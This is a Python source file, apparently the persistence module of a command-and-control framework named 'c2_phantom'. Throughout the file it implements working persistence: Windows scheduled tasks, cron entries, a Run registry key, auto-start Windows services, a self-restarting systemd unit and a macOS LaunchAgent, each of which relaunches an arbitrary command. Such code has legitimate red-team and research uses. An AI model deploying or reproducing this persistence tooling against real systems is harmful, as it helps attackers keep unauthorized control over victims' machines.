"""
Persistence manager for cross-platform persistence mechanisms.

Supports scheduled tasks, registry modifications, cron jobs, and services.
"""

import os
import sys
import platform
from pathlib import Path
from typing import Optional
import subprocess

from c2_phantom.core.exceptions import PersistenceError


class PersistenceManager:
    """Manages persistence mechanisms across platforms."""

    def __init__(self) -> None:
        """Initialize persistence manager."""
        self.platform = platform.system().lower()

    def create_scheduled_task(
        self,
        task_name: str,
        command: str,
        interval: str = "daily",
        time: str = "09:00",
    ) -> bool:
        """
        Create a scheduled task.

        Args:
            task_name: Name of the task
            command: Command to execute
            interval: Interval (daily, weekly, hourly)
            time: Time to run (HH:MM format)

        Returns:
            True if successful

        Raises:
            PersistenceError: If creation fails
        """
        try:
            if self.platform == "windows":
                return self._create_windows_scheduled_task(task_name, command, interval, time)
            elif self.platform in ["linux", "darwin"]:
                return self._create_unix_cron_job(task_name, command, interval, time)
            else:
                raise PersistenceError(f"Unsupported platform: {self.platform}")

        except Exception as e:
            raise PersistenceError(f"Failed to create scheduled task: {str(e)}")

    def _create_windows_scheduled_task(
        self, task_name: str, command: str, interval: str, time: str
    ) -> bool:
        """Create Windows scheduled task using schtasks."""
        try:
            # Build schtasks command
            interval_map = {
                "daily": "DAILY",
                "weekly": "WEEKLY",
                "hourly": "HOURLY",
            }

            schedule_type = interval_map.get(interval.lower(), "DAILY")

            schtasks_cmd = [
                "schtasks",
                "/create",
                "/tn",
                task_name,
                "/tr",
                command,
                "/sc",
                schedule_type,
                "/st",
                time,
                "/f",  # Force creation
            ]

            result = subprocess.run(
                schtasks_cmd,
                capture_output=True,
                text=True,
                check=True,
            )

            return result.returncode == 0

        except subprocess.CalledProcessError as e:
            raise PersistenceError(f"schtasks failed: {e.stderr}")

    def _create_unix_cron_job(
        self, task_name: str, command: str, interval: str, time: str
    ) -> bool:
        """Create cron job on Linux/macOS."""
        try:
            # Parse time
            hour, minute = time.split(":")

            # Build cron expression
            if interval == "daily":
                cron_expr = f"{minute} {hour} * * *"
            elif interval == "weekly":
                cron_expr = f"{minute} {hour} * * 0"  # Sunday
            elif interval == "hourly":
                cron_expr = f"{minute} * * * *"
            else:
                cron_expr = f"{minute} {hour} * * *"

            # Add to crontab
            cron_line = f"{cron_expr} {command}  # {task_name}\n"

            # Get current crontab
            result = subprocess.run(
                ["crontab", "-l"],
                capture_output=True,
                text=True,
            )

            current_crontab = result.stdout if result.returncode == 0 else ""

            # Append new job
            new_crontab = current_crontab + cron_line

            # Write new crontab
            process = subprocess.Popen(
                ["crontab", "-"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )

            stdout, stderr = process.communicate(input=new_crontab)

            if process.returncode != 0:
                raise PersistenceError(f"crontab failed: {stderr}")

            return True

        except Exception as e:
            raise PersistenceError(f"Failed to create cron job: {str(e)}")

    def create_registry_key(self, key_name: str, value: str) -> bool:
        """
        Create Windows registry key for persistence.

        Args:
            key_name: Registry key name
            value: Key value (command to execute)

        Returns:
            True if successful

        Raises:
            PersistenceError: If creation fails
        """
        if self.platform != "windows":
            raise PersistenceError("Registry persistence only available on Windows")

        try:
            import winreg

            # Open Run key
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                key_path,
                0,
                winreg.KEY_SET_VALUE,
            )

            # Set value
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(key)

            return True

        except ImportError:
            raise PersistenceError("winreg module not available")
        except Exception as e:
            raise PersistenceError(f"Failed to create registry key: {str(e)}")

    def install_service(self, service_name: str, command: str, description: str = "") -> bool:
        """
        Install as system service.

        Args:
            service_name: Service name
            command: Command to execute
            description: Service description

        Returns:
            True if successful

        Raises:
            PersistenceError: If installation fails
        """
        try:
            if self.platform == "windows":
                return self._install_windows_service(service_name, command, description)
            elif self.platform == "linux":
                return self._install_systemd_service(service_name, command, description)
            elif self.platform == "darwin":
                return self._install_launchd_service(service_name, command, description)
            else:
                raise PersistenceError(f"Unsupported platform: {self.platform}")

        except Exception as e:
            raise PersistenceError(f"Failed to install service: {str(e)}")

    def _install_windows_service(self, service_name: str, command: str, description: str) -> bool:
        """Install Windows service using sc."""
        try:
            sc_cmd = [
                "sc",
                "create",
                service_name,
                "binPath=",
                command,
                "start=",
                "auto",
            ]

            if description:
                sc_cmd.extend(["DisplayName=", description])

            result = subprocess.run(
                sc_cmd,
                capture_output=True,
                text=True,
                check=True,
            )

            return result.returncode == 0

        except subprocess.CalledProcessError as e:
            raise PersistenceError(f"sc failed: {e.stderr}")

    def _install_systemd_service(self, service_name: str, command: str, description: str) -> bool:
        """Install systemd service on Linux."""
        try:
            service_file = f"/etc/systemd/system/{service_name}.service"

            service_content = f"""[Unit]
Description={description or service_name}
After=network.target

[Service]
Type=simple
ExecStart={command}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""

            # Write service file (requires root)
            with open(service_file, "w") as f:
                f.write(service_content)

            # Reload systemd
            subprocess.run(["systemctl", "daemon-reload"], check=True)

            # Enable service
            subprocess.run(["systemctl", "enable", service_name], check=True)

            return True

        except PermissionError:
            raise PersistenceError("Root privileges required to install service")
        except Exception as e:
            raise PersistenceError(f"Failed to install systemd service: {str(e)}")

    def _install_launchd_service(self, service_name: str, command: str, description: str) -> bool:
        """Install launchd service on macOS."""
        try:
            plist_path = Path.home() / "Library" / "LaunchAgents" / f"{service_name}.plist"
            plist_path.parent.mkdir(parents=True, exist_ok=True)

            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{service_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{command}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""

            with open(plist_path, "w") as f:
                f.write(plist_content)

            # Load service
            subprocess.run(["launchctl", "load", str(plist_path)], check=True)

            return True

        except Exception as e:
            raise PersistenceError(f"Failed to install launchd service: {str(e)}")

    def remove_scheduled_task(self, task_name: str) -> bool:
        """
        Remove scheduled task.

        Args:
            task_name: Task name

        Returns:
            True if successful
        """
        try:
            if self.platform == "windows":
                subprocess.run(["schtasks", "/delete", "/tn", task_name, "/f"], check=True)
            elif self.platform in ["linux", "darwin"]:
                # Remove from crontab
                result = subprocess.run(
                    ["crontab", "-l"],
                    capture_output=True,
                    text=True,
                )
                current_crontab = result.stdout

                # Filter out the task
                new_crontab = "\n".join(
                    line for line in current_crontab.split("\n")
                    if task_name not in line
                )

                # Write new crontab
                process = subprocess.Popen(
                    ["crontab", "-"],
                    stdin=subprocess.PIPE,
                    text=True,
                )
                process.communicate(input=new_crontab)

            return True

        except Exception:
            return False
